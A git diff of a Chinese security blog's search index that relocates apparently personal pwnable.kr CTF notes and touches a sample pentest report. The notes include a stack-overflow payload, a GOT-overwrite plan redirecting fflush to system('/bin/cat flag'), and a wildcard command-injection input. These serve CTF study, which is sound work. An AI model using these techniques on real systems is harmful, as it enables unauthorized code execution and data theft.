+    <content><![CDATA[<h1 id="pwnable-kr-1"><a href="#pwnable-kr-1" class="headerlink" title="pwnable.kr (1)"></a>pwnable.kr (1)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>函数调用栈的查看<br>backtrace：查看函数调用的顺序（函数调用栈的信息）<br>frame N：切换到栈编号为N的上下文中<br>info frame：查看当前函数调用的栈帧信息</p>
+<p>“disassemble /r”命令可以用16进制形式显示程序的原始机器码<br>disass /r ‘fflush@plt’</p>
+<p>echo $PATH</p>
+<a id="more"></a>
+<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>32位， <code>p32()</code> 可以让我们转换整数到<code>小端序</code>格式</p>
+<pre><code>c.sendline(b&quot;AAAA&quot;*13+p32(0xcafebabe))</code></pre>
+<p>加个<code>b</code>，不然是str格式，即<code>utf-8</code>，编码不一样<br>bytes字节符，打印以b开头</p>
+<pre><code>┌─[zentreisender@parrotos]─[~/Documents/pwnable.kr/BOF]
+└──╼ $python3 exploit.py 
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+$ id
+uid=1008(bof) gid=1008(bof) groups=1008(bof)</code></pre>
+<p>id 命令</p>
+<h3 id="带参运行"><a href="#带参运行" class="headerlink" title="带参运行"></a>带参运行</h3><p>shell=ssh(‘col’,’pwnable.kr’, port=2222 ,password=’guest’)<br>p=shell.process(argv=[‘./col’,data_final]) #带参运行<br>ssh 链接也可以用process()</p>
+<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。<br>每个<code>Unix进程（</code>除了可能的守护进程）应均有<code>三个标准的POSIX文件描述符</code>，对应于三个标准流</p>
+<p>strcmp()<br>0    the contents of both strings are equal</p>
+<pre><code>0    Standard input    STDIN_FILENO    stdin
+1    Standard output    STDOUT_FILENO    stdout
+2    Standard error    STDERR_FILENO    stderr</code></pre>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>做的少了，拿着文件单步运行了半天，又是strace , ltrace ,想看出些名堂，后来偶然看到upx字符串，就想不是win才有upx压缩，最后放弃；一搜wp才发现linux底下，<code>upx -d </code>就行。</p>
+<p>断点到leave, 然后<br>peda:<br><code>x/s malloc</code>地址就得到flag</p>
+<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>got 表项覆盖</p>
+<p><a href="https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283">https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283</a><br>栈溢出，<code>scanf(%100, name)</code></p>
+<pre><code>   0x804862f &lt;welcome+38&gt;:    lea    edx,[ebp-0x70]</code></pre>
+<p>0x70=112 至少116个字符溢出到返回地址，name总共一百，所以溢出name不行</p>
+<hr>
+<p>  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4<br>我们直接在相应位置ebp-0x10, ebp-0xc放入想要的数字，但是scanf遇空格结束输入 </p>
+<p>gdb-peda$ print $ebp-0x70<br>$1 = (void *) 0xffe43ab8</p>
+<pre><code>0x804857c &lt;login+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]
+
+0x80485aa &lt;login+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]
+
+0x80485c5 &lt;login+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e6
+0x80485ce &lt;login+106&gt;:    cmp    DWORD PTR [ebp-0xc],0xcc07c9</code></pre>
+<p>0x70-xc =100 刚好溢出不到</p>
+<hr>
+<p>scanf()函数接收输入数据时，遇以下情况结束一个数据的输入：<br>① 遇空格、“回车”、“跳格”键。<br>② 遇宽度结束。<br>③ 遇非法输入。</p>
+<hr>
+<p>Partial RELRO(The GOT table can be overwritten)</p>
+<p>So, if I <code>overwrite fflush@got.plt address</code> as <code>system(“/bin/cat flag”)</code>; address, this binary will execute system(“/bin/cat flag”); after scanf .</p>
+<h3 id="小端序研究"><a href="#小端序研究" class="headerlink" title="小端序研究"></a>小端序研究</h3><pre><code>objdump -R ./passcode
+0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+
+plt 表项
+8048430:    ff 25 04 a0 04 08        jmp    *0x804a004
+命令中地址倒序，即小端序
+got 表中地址也是倒序，即小端序
+0x804a00c &lt;puts@got.plt&gt;:    0xf7597ca0
+0x804a00c &lt;puts@got.plt&gt;:    0xa0    0x7c    0x59 0xf7
+
+栈中地址也是小端序
+0000| 0xffb30e38 --&gt; 0xffb30e58
+gdb-peda$ x/4bx $esp
+0xffb30e38:    0x58    0x0e    0xb3    0xff
+
+只是存储方式是小端序，读出来还是原本的顺序
+payload += p32(0x0804a004)所以我们小端序写入栈中，执行地址没有小端序，why?
+
+输入12345678 = 0xBC 614E
+gdb-peda$ x/4bx $ebp-0xc
+0xffffcf4c:    0x4e    0x61    0xbc    0x00
+栈中是小端序
+输入的是单字节还是顺序存储，多字节如int，都是小端序</code></pre>
+<hr>
+<p>将fflush的got中的地址改为system的地址，这个地址不是libc库中的地址，而是代码段中的地址，即可以是任意可执行地址， 例如0x080485ea，但还要传参数，所以要提前一些：</p>
+<pre><code>   0x080485e3 &lt;+127&gt;:    mov    DWORD PTR [esp],0x80487af
+   0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;
+   0x080485ef &lt;+139&gt;:    leave  
+   0x080485f0 &lt;+140&gt;:    ret    </code></pre>
+<p>0x80487af 字符串参数<br> 0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;</p>
+<p>代码：<br><a href="https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py">https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py</a></p>
+<h2 id="rondom"><a href="#rondom" class="headerlink" title="rondom"></a>rondom</h2><p>简单，rand() 不是true rondom</p>
+<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/9056630.html">https://www.cnblogs.com/ichunqiu/p/9056630.html</a><br>在执行add r0, r1, #5指令时，第二条指令正在译码阶段，而第三条指令正在取指阶段。在执行第一条指令时，PC寄存器应指向第三条指令。也即，当处理器为三级流水线结构时，PC寄存器总是指向随后的第三条指令。</p>
+<p>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节<br>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节 </p>
+<pre><code>/*  key1
+    0x00008cdc &lt;+8&gt;:    mov    r3, pc
+       0x00008ce0 &lt;+12&gt;:    mov    r0, r3
+           pc=0x8ce4
+    r4=pc
+    key2
+    取pc值的时候应该还在arm状态
+        pc=0x00008d0c
+    key3
+    lr 返回地址=0x00008d80
+将三个pc值加在一起 等于输入进的 k
+*/</code></pre>
+<p>服务器好像down了<br>直接给falg:<code>My daddy has a lot of ARMv5te muscle!</code></p>
+<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0</p>
+<p>比较运算符高于赋值运算符</p>
+<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p><a href="https://linux.die.net/man/7/credentials">https://linux.die.net/man/7/credentials</a><br><a href="https://en.wikipedia.org/wiki/User_identifier">https://en.wikipedia.org/wiki/User_identifier</a></p>
+<h3 id="各user-id"><a href="#各user-id" class="headerlink" title="各user id"></a>各user id</h3><p>Effective user ID and effective group ID. These IDs are used by the kernel to determine the permissions that the process will have when accessing shared resources such as message queues, shared memory, and semaphores.On most UNIX systems, these IDs also determine the permissions when accessing files.<br> obtain its effective user (group) ID using geteuid(2) (getegid(2)).</p>
+<p>Saved set-user-ID and saved set-group-ID. These IDs are used in set-user-ID and set-group-ID programs to <code>save a copy of the corresponding effective IDs </code>that were set when the program was executed (see execve(2)).<br>A set-user-ID program can assume and drop privileges by switching its effective user ID back and forth between the values in its real user ID and saved set-user-ID. This switching is done via calls to seteuid(2), setreuid(2), or setresuid(2).<br>比如ruid是普通用户，此时降权；suid是root，设置euid为suid后，提权<br> A process can obtain its saved set-user-ID (set-group-ID) using getresuid(2) (getresgid(2)).</p>
+<p>Real user ID and real group ID. These IDs determine who owns the process. A process can obtain its real user (group) ID using getuid(2) (getgid(2)).</p>
+<h3 id="setuid属性，权限，即文件有-s"><a href="#setuid属性，权限，即文件有-s" class="headerlink" title="setuid属性，权限，即文件有+s"></a>setuid属性，权限，即文件有+s</h3><p>-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file’s owner (commonly root) and/or the file’s group, depending upon the flags set</p>
+<p>chmod by setting the high-order octal digit to 4 for setuid or 2 for setgid. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file, the process will run with user and group permissions set upon it by its owner. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>4701 on an executable file owned by ‘root’ and the group ‘root’</p>
+<p>A user named ‘thompson’ attempts to execute the file. The executable permission for all users is set (the ‘1’) so ‘thompson’ can execute the file. The file owner is ‘root’ and the SUID permission is set (the ‘4’) - so the file is executed as ‘root’.</p>
+<h3 id="本题权限"><a href="#本题权限" class="headerlink" title="本题权限"></a>本题权限</h3><p>shellshock@pwnable:~$ stat -c “%a %A” shellshock<br>2555 -r-xr-sr-x<br> setgid bits</p>
+<p>破壳（ShellShock）漏洞<br><a href="https://www.freebuf.com/articles/system/45390.html">https://www.freebuf.com/articles/system/45390.html</a></p>
+<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>服务器上没有按pwntools，运行不起来，改成re+socket中不行，懒得弄了</p>
+<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><p>echo $PATH<br>PATH表明程序所在的目录，运行一个程序，不在当前文件夹中，会遍历PATH中的目录，寻找程序所在文件夹<br>cat 命令在<code>/bin</code> 下<br>该题，用到了linux通配符<br><code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>
+]]></content>
+      <categories>
+        <category>pwnable.kr</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
       </tags>
   </entry>
   <entry>
@@ -4074,7 +4442,7 @@ dmm   List modules of target process
 <h3 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h3><p>级别：高<br>描述：MegaCorp One内外部环境中有许多未打补丁的系统和程序。<br>影响：弱授权机制和未打补丁的主机，都包含可以用爆破的漏洞，这会使得攻击者以未授权的方式得到大量的公司资产。特别地，例如SQLiite Manager包含远程执行代码的漏洞，底层主机也有一个本地提权的漏洞，这些可以使对外开放的主机轻易地被攻陷。表明了补丁管理策略以及强制执行的不足。<br>修复：所有的公司资产都要及时打上供应商提供的补丁。要完成这些可以使用供应商官方工具或者第三方程序，这些都能检查出未应用的补丁。在许多例子中，第三方工具也可以用来在一个混乱的环境中进行补丁部署。</p>
 <h3 id="DNS区域传送"><a href="#DNS区域传送" class="headerlink" title="DNS区域传送"></a>DNS区域传送</h3><p>级别：低<br>描述：一个错误配置的DNS服务器允许无限制的区域传送。<br>影响：一个配置成可与任何DNS服务器传输数据的DNS服务器，会泄露关于公司资产和网络布局等敏感信息。<br>修复：DNS区域传送需仅对已证明的服务器开放。</p>
 <h3 id="默认APACHE文件目录"><a href="#默认APACHE文件目录" class="headerlink" title="默认APACHE文件目录"></a>默认APACHE文件目录</h3><p>级别：低<br>描述：在admin.megacorpone.com主机上发现了默认的Apache文件目录。<br>影响：攻击者通过检查默认文件夹可能猜出Apache服务器的版本。敏感信息也可能泄露。<br>修复：移除公开网站的所有默认文件。</p>
-<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#x69;&#x6e;&#102;&#111;&#64;&#x6f;&#x66;&#x66;&#115;&#101;&#x63;&#x2e;&#99;&#x6f;&#109;">&#x69;&#x6e;&#102;&#111;&#64;&#x6f;&#x66;&#x66;&#115;&#101;&#x63;&#x2e;&#99;&#x6f;&#109;</a>联系我们。</p>
+<h2 id="附录B-关于Offensive-Security"><a href="#附录B-关于Offensive-Security" class="headerlink" title="附录B:关于Offensive Security"></a>附录B:关于Offensive Security</h2><p>Offensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。<br>黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。<br>黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。<br>Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。<br>请通过<a href="mailto:&#105;&#110;&#x66;&#111;&#64;&#x6f;&#x66;&#x66;&#115;&#101;&#99;&#x2e;&#x63;&#111;&#109;">&#105;&#110;&#x66;&#111;&#64;&#x6f;&#x66;&#x66;&#115;&#101;&#99;&#x2e;&#x63;&#111;&#109;</a>联系我们。</p>
 ]]></content>
       <tags>
         <tag>penetation test</tag>
@@ -4485,374 +4853,6 @@ else
 ]]></content>
       <tags>
         <tag>ios</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwnable.kr (1)</title>
-    <url>/2021/03/06/pwnable.kr_1/</url>
-    <content><![CDATA[<h1 id="pwnable-kr-1"><a href="#pwnable-kr-1" class="headerlink" title="pwnable.kr (1)"></a>pwnable.kr (1)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>函数调用栈的查看<br>backtrace：查看函数调用的顺序（函数调用栈的信息）<br>frame N：切换到栈编号为N的上下文中<br>info frame：查看当前函数调用的栈帧信息</p>
-<p>“disassemble /r”命令可以用16进制形式显示程序的原始机器码<br>disass /r ‘fflush@plt’</p>
-<p>echo $PATH</p>
-<a id="more"></a>
-<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>32位， <code>p32()</code> 可以让我们转换整数到<code>小端序</code>格式</p>
-<pre><code>c.sendline(b&quot;AAAA&quot;*13+p32(0xcafebabe))</code></pre>
-<p>加个<code>b</code>，不然是str格式，即<code>utf-8</code>，编码不一样<br>bytes字节符，打印以b开头</p>
-<pre><code>┌─[zentreisender@parrotos]─[~/Documents/pwnable.kr/BOF]
-└──╼ $python3 exploit.py 
-[+] Opening connection to pwnable.kr on port 9000: Done
-[*] Switching to interactive mode
-$ id
-uid=1008(bof) gid=1008(bof) groups=1008(bof)</code></pre>
-<p>id 命令</p>
-<h3 id="带参运行"><a href="#带参运行" class="headerlink" title="带参运行"></a>带参运行</h3><p>shell=ssh(‘col’,’pwnable.kr’, port=2222 ,password=’guest’)<br>p=shell.process(argv=[‘./col’,data_final]) #带参运行<br>ssh 链接也可以用process()</p>
-<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。<br>每个<code>Unix进程（</code>除了可能的守护进程）应均有<code>三个标准的POSIX文件描述符</code>，对应于三个标准流</p>
-<p>strcmp()<br>0    the contents of both strings are equal</p>
-<pre><code>0    Standard input    STDIN_FILENO    stdin
-1    Standard output    STDOUT_FILENO    stdout
-2    Standard error    STDERR_FILENO    stderr</code></pre>
-<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>做的少了，拿着文件单步运行了半天，又是strace , ltrace ,想看出些名堂，后来偶然看到upx字符串，就想不是win才有upx压缩，最后放弃；一搜wp才发现linux底下，<code>upx -d </code>就行。</p>
-<p>断点到leave, 然后<br>peda:<br><code>x/s malloc</code>地址就得到flag</p>
-<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>got 表项覆盖</p>
-<p><a href="https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283">https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283</a><br>栈溢出，<code>scanf(%100, name)</code></p>
-<pre><code>   0x804862f &lt;welcome+38&gt;:    lea    edx,[ebp-0x70]</code></pre>
-<p>0x70=112 至少116个字符溢出到返回地址，name总共一百，所以溢出name不行</p>
-<hr>
-<p>  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4<br>我们直接在相应位置ebp-0x10, ebp-0xc放入想要的数字，但是scanf遇空格结束输入 </p>
-<p>gdb-peda$ print $ebp-0x70<br>$1 = (void *) 0xffe43ab8</p>
-<pre><code>0x804857c &lt;login+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]
-
-0x80485aa &lt;login+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]
-
-0x80485c5 &lt;login+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e6
-0x80485ce &lt;login+106&gt;:    cmp    DWORD PTR [ebp-0xc],0xcc07c9</code></pre>
-<p>0x70-xc =100 刚好溢出不到</p>
-<hr>
-<p>scanf()函数接收输入数据时，遇以下情况结束一个数据的输入：<br>① 遇空格、“回车”、“跳格”键。<br>② 遇宽度结束。<br>③ 遇非法输入。</p>
-<hr>
-<p>Partial RELRO(The GOT table can be overwritten)</p>
-<p>So, if I <code>overwrite fflush@got.plt address</code> as <code>system(“/bin/cat flag”)</code>; address, this binary will execute system(“/bin/cat flag”); after scanf .</p>
-<h3 id="小端序研究"><a href="#小端序研究" class="headerlink" title="小端序研究"></a>小端序研究</h3><pre><code>objdump -R ./passcode
-0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
-
-plt 表项
-8048430:    ff 25 04 a0 04 08        jmp    *0x804a004
-命令中地址倒序，即小端序
-got 表中地址也是倒序，即小端序
-0x804a00c &lt;puts@got.plt&gt;:    0xf7597ca0
-0x804a00c &lt;puts@got.plt&gt;:    0xa0    0x7c    0x59 0xf7
-
-栈中地址也是小端序
-0000| 0xffb30e38 --&gt; 0xffb30e58
-gdb-peda$ x/4bx $esp
-0xffb30e38:    0x58    0x0e    0xb3    0xff
-
-只是存储方式是小端序，读出来还是原本的顺序
-payload += p32(0x0804a004)所以我们小端序写入栈中，执行地址没有小端序，why?
-
-输入12345678 = 0xBC 614E
-gdb-peda$ x/4bx $ebp-0xc
-0xffffcf4c:    0x4e    0x61    0xbc    0x00
-栈中是小端序
-输入的是单字节还是顺序存储，多字节如int，都是小端序</code></pre>
-<hr>
-<p>将fflush的got中的地址改为system的地址，这个地址不是libc库中的地址，而是代码段中的地址，即可以是任意可执行地址， 例如0x080485ea，但还要传参数，所以要提前一些：</p>
-<pre><code>   0x080485e3 &lt;+127&gt;:    mov    DWORD PTR [esp],0x80487af
-   0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;
-   0x080485ef &lt;+139&gt;:    leave  
-   0x080485f0 &lt;+140&gt;:    ret    </code></pre>
-<p>0x80487af 字符串参数<br> 0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;</p>
-<p>代码：<br><a href="https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py">https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py</a></p>
-<h2 id="rondom"><a href="#rondom" class="headerlink" title="rondom"></a>rondom</h2><p>简单，rand() 不是true rondom</p>
-<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/9056630.html">https://www.cnblogs.com/ichunqiu/p/9056630.html</a><br>在执行add r0, r1, #5指令时，第二条指令正在译码阶段，而第三条指令正在取指阶段。在执行第一条指令时，PC寄存器应指向第三条指令。也即，当处理器为三级流水线结构时，PC寄存器总是指向随后的第三条指令。</p>
-<p>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节<br>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节 </p>
-<pre><code>/*  key1
-    0x00008cdc &lt;+8&gt;:    mov    r3, pc
-       0x00008ce0 &lt;+12&gt;:    mov    r0, r3
-           pc=0x8ce4
-    r4=pc
-    key2
-    取pc值的时候应该还在arm状态
-        pc=0x00008d0c
-    key3
-    lr 返回地址=0x00008d80
-将三个pc值加在一起 等于输入进的 k
-*/</code></pre>
-<p>服务器好像down了<br>直接给falg:<code>My daddy has a lot of ARMv5te muscle!</code></p>
-<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0</p>
-<p>比较运算符高于赋值运算符</p>
-<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p><a href="https://linux.die.net/man/7/credentials">https://linux.die.net/man/7/credentials</a><br><a href="https://en.wikipedia.org/wiki/User_identifier">https://en.wikipedia.org/wiki/User_identifier</a></p>
-<h3 id="各user-id"><a href="#各user-id" class="headerlink" title="各user id"></a>各user id</h3><p>Effective user ID and effective group ID. These IDs are used by the kernel to determine the permissions that the process will have when accessing shared resources such as message queues, shared memory, and semaphores.On most UNIX systems, these IDs also determine the permissions when accessing files.<br> obtain its effective user (group) ID using geteuid(2) (getegid(2)).</p>
-<p>Saved set-user-ID and saved set-group-ID. These IDs are used in set-user-ID and set-group-ID programs to <code>save a copy of the corresponding effective IDs </code>that were set when the program was executed (see execve(2)).<br>A set-user-ID program can assume and drop privileges by switching its effective user ID back and forth between the values in its real user ID and saved set-user-ID. This switching is done via calls to seteuid(2), setreuid(2), or setresuid(2).<br>比如ruid是普通用户，此时降权；suid是root，设置euid为suid后，提权<br> A process can obtain its saved set-user-ID (set-group-ID) using getresuid(2) (getresgid(2)).</p>
-<p>Real user ID and real group ID. These IDs determine who owns the process. A process can obtain its real user (group) ID using getuid(2) (getgid(2)).</p>
-<h3 id="setuid属性，权限，即文件有-s"><a href="#setuid属性，权限，即文件有-s" class="headerlink" title="setuid属性，权限，即文件有+s"></a>setuid属性，权限，即文件有+s</h3><p>-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file’s owner (commonly root) and/or the file’s group, depending upon the flags set</p>
-<p>chmod by setting the high-order octal digit to 4 for setuid or 2 for setgid. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file, the process will run with user and group permissions set upon it by its owner. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.</p>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>4701 on an executable file owned by ‘root’ and the group ‘root’</p>
-<p>A user named ‘thompson’ attempts to execute the file. The executable permission for all users is set (the ‘1’) so ‘thompson’ can execute the file. The file owner is ‘root’ and the SUID permission is set (the ‘4’) - so the file is executed as ‘root’.</p>
-<h3 id="本题权限"><a href="#本题权限" class="headerlink" title="本题权限"></a>本题权限</h3><p>shellshock@pwnable:~$ stat -c “%a %A” shellshock<br>2555 -r-xr-sr-x<br> setgid bits</p>
-<p>破壳（ShellShock）漏洞<br><a href="https://www.freebuf.com/articles/system/45390.html">https://www.freebuf.com/articles/system/45390.html</a></p>
-<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>服务器上没有按pwntools，运行不起来，改成re+socket中不行，懒得弄了</p>
-<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><p>echo $PATH<br>PATH表明程序所在的目录，运行一个程序，不在当前文件夹中，会遍历PATH中的目录，寻找程序所在文件夹<br>cat 命令在<code>/bin</code> 下<br>该题，用到了linux通配符<br><code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>
-]]></content>
-      <categories>
-        <category>pwnable.kr</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>heap入门1</title>
-    <url>/2021/03/12/heap%E5%85%A5%E9%97%A81/</url>
-    <content><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code> &quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;</code> 更改glibc版本<br><code>pwd</code>显示当前目录<br><code>apropos</code>搜索man手册<br><code>gef-&gt;search-patten</code><br><code>objdump -M intel</code>汇编改为intel语法<br><code>set disassambly intel</code> gdb更改语法<br><code>b print </code>printf函数下断点</p>
-<a id="more"></a>
-<p>在gdb 里启动gef<br><code>(gdb) source ~/.gdbinit-gef.py</code></p>
-<p>或者传递命令<br><code>gdb.attach(p,&quot;source ~/.gdbinit-gef.py&quot;)</code></p>
-<hr>
-<p><code>gef➤  heap-view </code></p>
-<pre><code>gef➤  got
-
-GOT protection: Partial RelRO | GOT functions: 3
-
-[0x804c00c] printf@GLIBC_2.0  →  0x8049036
-[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7ddcd40
-[0x804c014] __isoc99_scanf@GLIBC_2.7  →  0x8049056</code></pre>
-<hr>
-<pre><code>gef➤  heap bins
-gef➤  heap chunks
-
-gef➤  heap chunks
-Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)
-    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
-Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)
-    [0x00005555555592a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
-Chunk(addr=0x5555555592c0, size=0x20d50, flags=PREV_INUSE)  ←  top chunk
-gef➤  x/6gx 0x5555555592c0
-0x5555555592c0:    0x0000000000000000    0x0000000000000000
-0x5555555592d0:    0x0000000000000000    0x0000000000000000
-0x5555555592e0:    0x0000000000000000    0x0000000000000000
-gef➤  x/6gx 0x5555555592c0-0x10
-0x5555555592b0:    0x0000000000000000    0x0000000000020d51
-0x5555555592c0:    0x0000000000000000    0x0000000000000000
-0x5555555592d0:    0x0000000000000000    0x0000000000000000</code></pre>
-<p>查看glibc版本</p>
-<pre><code>┌─[✗]─[zentreisender@parrotos]─[~]
-└──╼ $ldd --version
-ldd ./program 显示链接器，加载器版本</code></pre>
-<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><code>call malloc, it returns a pointer to a chunk</code><br>返回一个地址</p>
-<p>64bit 一个chunk段16字节，32bit 8 字节</p>
-<p>查看二进制文件依赖的动态链接库命令 ldd</p>
-<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术</p>
-<h3 id="RELRC"><a href="#RELRC" class="headerlink" title="RELRC"></a>RELRC</h3><p>Firstly, <code>PLT</code> needs to be located at <code>a fixed offset</code> from the .text section. Secondly, since GOT contains data used by different parts of the program directly, it needs to be allocated at a known static address in memory. Lastly, and more importantly, because the GOT is lazily bound it needs to be writable.</p>
